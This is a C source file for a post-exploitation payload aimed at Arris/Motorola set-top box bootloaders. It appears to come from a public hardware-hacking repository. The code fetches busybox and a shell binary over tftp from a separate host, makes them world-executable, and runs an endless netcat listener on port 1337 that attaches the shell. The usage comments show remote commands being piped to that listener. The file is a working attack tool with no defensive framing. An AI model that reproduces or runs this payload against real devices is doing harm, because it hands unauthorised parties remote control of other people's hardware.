/*
	Post exploit reverse shell for Arris/Motorola bootloader
	Author: https://github.com/antnks/arris-vip1113

	Usage:

	echo "/tmp/busybox id" | nc 192.168.99.97 1337
	echo "/tmp/busybox cat /proc/version" | nc 192.168.99.97 1337
*/

#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>

int main(int argc, char *argv[])
{
	int i = 0;
	fprintf(stderr, "exploit init");
	fprintf(stderr, "aaaa pwned\n");
	fprintf(stderr, "argc: %d\n", argc);
	for (i = 0; i< argc; i++)
		fprintf(stderr, "arg: %s\n", argv[i]);

	char exploit1[] = "/tmp/busybox";
	char exploit2[] = "/tmp/sh";
	int status;

	int pid = fork();
	if(!pid)
	{
		fprintf(stderr, "child 1 pid=%d\n", pid);
		execl("/usr/bin/tftp", "/usr/bin/tftp", "192.168.99.9", "busybox", exploit1, NULL);
		return 0;
	}
	fprintf(stderr, "parent 1 pid=%d\n", pid);
	pid = wait(&status);
	fprintf(stderr, "End of process %d\n", pid);

	pid = fork();
	if(!pid)
	{
		fprintf(stderr, "child 2 pid=%d\n", pid);
		execl("/usr/bin/tftp", "/usr/bin/tftp", "192.168.99.9", "busybox", exploit2, NULL);
		return 0;
	}
	fprintf(stderr, "parent 2 pid=%d\n", pid);
	pid = wait(&status);
	fprintf(stderr, "End of process %d\n", pid);


	fprintf(stderr, "checking file %s\n", exploit1);
	FILE *fin = fopen(exploit1, "rb");
	if (!fin)
	{
		fprintf(stderr, "%s does not exist\n", exploit1);
		return 0;
	}

	fprintf(stderr, "checking file %s\n", exploit2);
	fin = fopen(exploit2, "rb");
	if (!fin)
	{
		fprintf(stderr, "%s does not exist\n", exploit2);
		return 0;
	}

	sleep(5);

	char mode[] = "0777";
	int chmod_mode = strtol(mode, 0, 8);

	if (chmod (exploit1, chmod_mode) < 0)
	{
		fprintf(stderr, "Error in chmod %s\n", exploit1);
		return 0;
	}

	if (chmod (exploit2, chmod_mode) < 0)
	{
		fprintf(stderr, "Error in chmod %s\n", exploit2);
		return 0;
	}


	while(1)
	{
		pid = fork();
		if(!pid)
		{
			fprintf(stderr, "child 3 pid=%d\n", pid);
			execl(exploit1, exploit1, "nc", "-l", "-p", "1337", "-e", exploit2, NULL);
			return 0;	
		}
		fprintf(stderr, "parent 3 pid=%d\n", pid);
		pid = wait(&status);
    	fprintf(stderr, "End of process %d\n", pid);
	}

	return 0;

}

